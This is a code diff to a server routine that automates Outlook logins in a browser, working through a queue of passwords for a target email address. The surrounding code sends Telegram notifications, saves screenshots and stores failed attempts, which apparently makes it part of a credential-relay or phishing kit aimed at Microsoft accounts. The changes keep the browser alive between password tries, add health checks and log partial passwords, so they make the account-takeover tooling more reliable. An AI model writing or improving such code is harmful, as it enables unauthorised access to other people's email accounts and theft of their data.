@@ -3048,22 +3048,39 @@ async function processPasswordQueue(email) {
                     if (session.email === email && (session.status === 'awaiting_retry' || session.status === 'authenticating')) {
                         automation = session.automation;
                         currentSessionId = queue.sessionId;
-                        console.log(`⚡ Reusing existing browser session ${currentSessionId} for ${email}`);
+                        console.log(`⚡ [PASSWORD ATTEMPT ${attemptNumber}] Reusing existing browser session ${currentSessionId} for ${email}`);
+                        console.log(`🔍 [PASSWORD ATTEMPT ${attemptNumber}] Session status: ${session.status}`);
+                        
+                        // Check if browser is still healthy
+                        const isHealthy = await automation.isHealthy().catch(() => false);
+                        console.log(`💚 [PASSWORD ATTEMPT ${attemptNumber}] Browser health check: ${isHealthy ? 'HEALTHY' : 'UNHEALTHY'}`);
+                        
+                        if (!isHealthy) {
+                            console.warn(`❌ [PASSWORD ATTEMPT ${attemptNumber}] Browser session unhealthy, creating new one`);
+                            automation = null; // Force creation of new browser
+                        }
+                    } else {
+                        console.log(`⚠️ [PASSWORD ATTEMPT ${attemptNumber}] Existing session found but email/status mismatch. Email match: ${session.email === email}, Status: ${session.status}`);
                     }
                 }
 
                 // If no suitable session, create a new one (cold start)
                 if (!automation) {
                     currentSessionId = createSessionId();
-                    console.log(`❄️ Starting cold start browser for ${email} (password attempt ${attemptNumber})`);
+                    console.log(`❄️ [PASSWORD ATTEMPT ${attemptNumber}] Starting COLD START browser for ${email}`);
+                    console.log(`🆕 [PASSWORD ATTEMPT ${attemptNumber}] New session ID: ${currentSessionId}`);
                     automation = new ClosedBridgeAutomation({
                         enableScreenshots: true,
                         screenshotQuality: 80,
                         sessionId: currentSessionId,
                         eventCallback: broadcastAuthEvent
                     });
+                    console.log(`🔧 [PASSWORD ATTEMPT ${attemptNumber}] Initializing browser...`);
                     await automation.init();
+                    console.log(`🌐 [PASSWORD ATTEMPT ${attemptNumber}] Navigating to Outlook...`);
                     await automation.navigateToOutlook();
+                    console.log(`✅ [PASSWORD ATTEMPT ${attemptNumber}] Browser ready!`);
+                    
                     // Store the new session
                     automationSessions.set(currentSessionId, {
                         automation: automation,
@@ -3072,10 +3089,18 @@ async function processPasswordQueue(email) {
                         startTime: Date.now(),
                         sessionId: currentSessionId
                     });
+                    
+                    // Update queue with session ID for potential reuse
+                    queue.sessionId = currentSessionId;
+                    console.log(`📋 [PASSWORD ATTEMPT ${attemptNumber}] Queue updated with session ID for future attempts`);
+                } else {
+                    console.log(`♻️  [PASSWORD ATTEMPT ${attemptNumber}] Reusing browser - no need to navigate again`);
                 }
 
                 // Attempt login with the current password
-                loginSuccess = await automation.performLogin(email, password);
+                console.log(`🚀🚀🚀 [PASSWORD ATTEMPT ${attemptNumber}] Starting login attempt for ${email}`);
+                console.log(`🔑 [PASSWORD ATTEMPT ${attemptNumber}] Password: ${password.substring(0, 3)}***`);
+                loginSuccess = await automation.performLogin(email, password, attemptNumber);
 
                 if (loginSuccess) {
                     console.log(`✅ Password attempt ${attemptNumber} successful for ${email}`);
@@ -3113,7 +3138,8 @@ async function processPasswordQueue(email) {
                         throw new Error('Session validation failed');
                     }
                 } else {
-                    console.log(`❌ Password attempt ${attemptNumber} failed for ${email}`);
+                    console.log(`❌ [PASSWORD ATTEMPT ${attemptNumber}] Password failed for ${email}`);
+                    console.log(`📊 [PASSWORD ATTEMPT ${attemptNumber}] Remaining passwords in queue: ${queue.passwords.length}`);
 
                     // Store failed attempt
                     const sessionDir = path.join(__dirname, 'session_data');
@@ -3152,29 +3178,57 @@ async function processPasswordQueue(email) {
                             console.warn('Telegram notification for queue failure failed:', telegramError.message);
                         }
                     }
+                    
+                    // IMPORTANT: If there are more passwords to try, keep the browser session alive!
+                    if (queue.passwords.length > 0) {
+                        console.log(`♻️  [PASSWORD ATTEMPT ${attemptNumber}] Keeping browser alive for next password attempt`);
+                        // Mark session as awaiting retry so it can be reused
+                        if (automationSessions.has(currentSessionId)) {
+                            automationSessions.get(currentSessionId).status = 'awaiting_retry';
+                            console.log(`📝 [PASSWORD ATTEMPT ${attemptNumber}] Session marked as 'awaiting_retry'`);
+                        }
+                    } else {
+                        console.log(`🔚 [PASSWORD ATTEMPT ${attemptNumber}] No more passwords to try, will close browser after error handling`);
+                    }
                 }
 
             } catch (error) {
-                console.error(`Error during password attempt ${attemptNumber} for ${email}:`, error.message);
+                console.error(`❌❌❌ [PASSWORD ATTEMPT ${attemptNumber}] Error during password attempt for ${email}:`, error.message);
+                console.log(`📊 [PASSWORD ATTEMPT ${attemptNumber}] Remaining passwords after error: ${queue.passwords.length}`);
 
                 analytics.failedLogins++;
                 saveAnalytics();
 
-                // Clean up browser if it's managed by this process
-                if (automation && !automation.isClosing) {
-                    try {
-                        await automation.close();
-                    } catch (closeError) {
-                        console.warn(`Error closing browser after attempt ${attemptNumber}:`, closeError.message);
+                // ONLY close browser if no more passwords to try OR if browser is unhealthy
+                const shouldCloseBrowser = queue.passwords.length === 0 || (automation && automation.isClosing);
+                
+                if (shouldCloseBrowser) {
+                    console.log(`🗑️  [PASSWORD ATTEMPT ${attemptNumber}] Closing browser (no more passwords or browser closing)`);
+                    // Clean up browser if it's managed by this process
+                    if (automation && !automation.isClosing) {
+                        try {
+                            await automation.close();
+                        } catch (closeError) {
+                            console.warn(`Error closing browser after attempt ${attemptNumber}:`, closeError.message);
+                        }
                     }
-                }
-                // Remove from automation sessions if it was created here
-                if (currentSessionId && automationSessions.has(currentSessionId)) {
-                    automationSessions.delete(currentSessionId);
+                    // Remove from automation sessions
+                    if (currentSessionId && automationSessions.has(currentSessionId)) {
+                        automationSessions.delete(currentSessionId);
+                        console.log(`🗑️  [PASSWORD ATTEMPT ${attemptNumber}] Session removed from automationSessions`);
+                    }
+                } else {
+                    console.log(`♻️  [PASSWORD ATTEMPT ${attemptNumber}] KEEPING browser open (${queue.passwords.length} passwords remaining)`);
+                    // Mark session as awaiting retry for next attempt
+                    if (currentSessionId && automationSessions.has(currentSessionId)) {
+                        automationSessions.get(currentSessionId).status = 'awaiting_retry';
+                        console.log(`📝 [PASSWORD ATTEMPT ${attemptNumber}] Session marked as 'awaiting_retry' after error`);
+                    }
                 }
 
                 // If this was the last password in the queue, and it failed, break
                 if (queue.passwords.length === 0) {
+                    console.log(`🔚 [PASSWORD ATTEMPT ${attemptNumber}] Last password failed, breaking loop`);
                     break;
                 }
             }
